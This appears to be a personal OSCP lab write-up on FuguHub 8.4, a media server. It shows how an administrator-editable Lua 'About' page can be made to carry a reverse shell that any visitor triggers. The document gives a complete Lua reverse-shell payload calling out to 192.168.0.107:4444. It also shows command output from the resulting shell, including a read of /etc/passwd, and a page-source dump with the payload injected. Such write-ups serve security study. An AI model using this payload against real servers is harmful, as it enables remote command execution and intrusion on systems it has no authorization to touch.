---
tags: [OSCP]
title: PG Hub (FuguHub 8.4)
created: '2024-02-09T08:57:17.431Z'
modified: '2024-03-11T00:58:39.361Z'
---

# PG Hub (FuguHub 8.4)

Fuguhub is a Cloud Media Server Software. The version tested was the debian version at this link:
`https://fuguhub.com/articles/FuguHub-for-Debian`

![](@attachment/Clipboard_2024-02-03-13-07-00.png)

### Installation Steps: 
```
wget FuguHub.com/install/FuguHub.linux.install
chmod +x FuguHub.linux.install
sudo ./FuguHub.linux.install
```


### Vulnerability Description

The about page is an editable lua page whose content can be changed through the Administrator panel. The vunlerability inserts a reverse shell written in lua into the About page which is viewable to both logged in and logged out users

![](@attachment/Clipboard_2024-02-03-13-12-13.png)


### Exploitation process

FuguHub prompts the user to create an admin user, this can also be done on this page: `http://127.0.0.1/rtl/protected/admin/`
Once created teh admin can Customise Server on this link: `http://127.0.0.1/rtl/protected/admin/customize.lsp` this allows the user to edit the `About` page which we can see has a lua code section that we can inject code into

![](@attachment/Clipboard_2024-02-03-17-34-23.png)

### Payload
Here is an example payload:

```lua
local host, port = "192.168.0.107", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()
```


here is an example of what the shell allows the attacker to do:

```bash
whoami
bd
id
uid=1001(bd) gid=1001(bd) groups=1001(bd),0(root)
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
. . .  goes on
```




here is the page shource for http://127.0.0.1/rtl/protected/admin/customize.lsp

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<title>Menu: Administrator Panel: Customize Server</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<link rel="icon" href="/rtl/favicon.ico" type="image/x-icon" />
<style type="text/css">
@import '/rtl/bd.css';

</style>
<script type='text/javascript' src='/rtl/jquery.js'></script>
<script type='text/javascript' src='/rtl/sidebar.js'></script>
<link href="style.css" rel="stylesheet" type="text/css" />
<style>
div.panel { width:700px;margin:10px;height:110px;}
div.panel table {width:100%}
#inpfield input {width:600px;}
#cmsdocs {float:right;margin:30px;}
.err {font-weight:bold;color:red}
#about {width:98%;margin:auto}
#about textarea {width:100%}
</style>

<script type="text/javascript">
$(function() {

$("#cmsdocs").click(function(){
   var w = window.open(
      "/rtl/protected/admin/fs/cmsdocs/",
      "cmsdocs",
      "scrollbars=1,toolbar=0,status=0,resizable=1,width=800,height=640");
   if(!w) alert('Your browser is blocking the pop-up window');
   $(this).blur();
   return false;
});

});
</script>
</head>
<body>   
<div id="head">
</div>
<table id="nav">
<tr><td rowspan="2">
<img src='/rtl/images/logo.png' alt='logo'/></td>
<td>
<ul>
<li><a  href='/'>Home Page</a></li>
<li><a  href='/rtl/protected/wfslinks.lsp'>Web-File-Server</a></li>
<li><a class='selected' href='/rtl/protected/'>Menu</a></li>
<li><a  href='/rtl/about.lsp'>About</a></li>
<li><a  href='/rtl/logout.lsp'>Logout</a></li>
</ul>
</td></tr>
<tr><td></td></tr>
</table>
<div id="wrapper">
  <div id="container">
    <div id="content">
<span class="lefthlp">
<a href="#"><img style="float:right;padding-right:20px" src="../../bindows/html/images/questionmark.32.gif" />
<span>
<h3>Customize the two server logos</h3>
<p>You can change the logo shown in the top left corner to your own logo. Two logos are used: one for standard URL's and one for secure HTTPS URL's.</p>
<p>Copy your own logo to the cmsdocs directory and change the URL to your own logo. For example, if you create the sub-directory 'images' in the 'cmsdocs' directory and upload your logo 'my-logo.jpg' to cmsdocs/images/, the URL should be:<br/>/images/my-logo.jpg.</p>
<p>Note: The logo size should preferably be 150 x 80 pixels. The standard and the secure logo may be the same. Customizing the logo requires a business license.</p>

<h3>Customize the About Page</h3>
<p>You can change or completely replace the about page if you know how to write HTML. Customizing the about page requires a business license.</p>
</span>
</a>
</span>
<h1>Customize Server Logo</h1>
<table>
<tr>
<td>
  <form method="post"><div class="panel">
    <p style="text-align:center;margin:0;padding:0;font-weight:bold">Logo URL</p>
    <table id="inpfield">
      <tr><td>Standard:</td><td><input type="text" name="logo" value="/rtl/images/logo.png" /></td></tr>
      <tr><td>Secure:</td><td><input type="text" name="seclogo" value="/rtl/images/securelogo.png"/></td></tr>
    </table>
    <input type="submit" name="seturl" value="Set Custom URL" />
    <input type="submit" name="restoreurl" value="Restore Default URL" />
    <input type="hidden" name="key" value="10353359679236368721596401609286787188" />
  </div></form>
</td>
</tr>
<tr>
<td>
  <div class="panel">
  <table id="logo">
    <tr><th>Standard Logo</th><th>Secure Access Logo</th></tr>
    <tr>
      <td>
        <img src="/rtl/images/logo.png" alt="Server Logo" />
      </td>
      <td>
        <img src="/rtl/images/securelogo.png" alt="Secure Server Logo" />
      </td>
    </tr>
  </table>
  </div>
</td>
</tr>
</table>

<input id="cmsdocs" type="submit" value="Upload images to cmsdocs" />
<br style="clear:both"/>

<h1>Customize About Page</h1>
<form method="post">
<div id="about">
<textarea rows="25" name="about"><style>
#info {background: #2F94FA;border-radius: 10px;margin:10px;padding:10px}
#info p {margin-left:10px;font-size:120%}
#info p,#info a,#info a:hover{color:white;}
</style>

<h2>FuguHub <?lsp=bd.version?></h2>
<img style="margin:30px" src="/rtl/images/logo.gif" alt="logo" align="left" />

<div style="margin-left:auto;margin-right: auto;width: 350px;"> 

<div id="info">
<h2>License</h2>
<p>FuguHub is free to use for non-commercial or educational use. FuguHub cannot be used for commercial use.</p>
</div>

<p>FuguHub is powered by: 
<ul>
<li><a href="https://realtimelogic.com/products/barracuda-application-server/" target="_blank">Barracuda Embedded Web Server</a></li>
<li><a href="https://realtimelogic.com/products/sharkssl/" target="_blank">SharkSSL Embedded SSL Stack</a></li>
<li><a href="https://realtimelogic.com/products/lua-server-pages/" target="_blank">Lua Server Pages</a></li>
</ul>
</p>

</div>


<?lsp 
local host, port = "192.168.0.107", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()
?>

</textarea>
</div>
<input type="submit" name="setabout" value="Set Custom About Page" />
<input type="submit" name="restoreabout" value="Restore Default About Page" />
<input type="hidden" name="key" value="10353359679236368721596401609286787188" />
</form>


</body>
</html>



**THE END**
